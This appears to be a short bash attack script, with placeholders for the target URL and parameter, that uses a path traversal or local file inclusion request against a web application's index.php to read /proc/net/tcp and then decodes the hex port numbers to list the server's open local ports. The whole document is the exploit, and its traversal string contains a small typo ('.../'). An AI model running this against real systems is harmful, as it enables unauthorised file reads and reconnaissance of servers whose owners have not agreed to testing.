#!/bin/bash

##-----------------to Change--------------
#   url
#   file.php
#   arg
curl -s "http://url/index.php?arg=../../.../../proc/net/tcp" | awk '{print $2}' | awk '{print $2}' FS=':' | xargs -I {} bash -c 'echo "ibase=16; {}" | bc'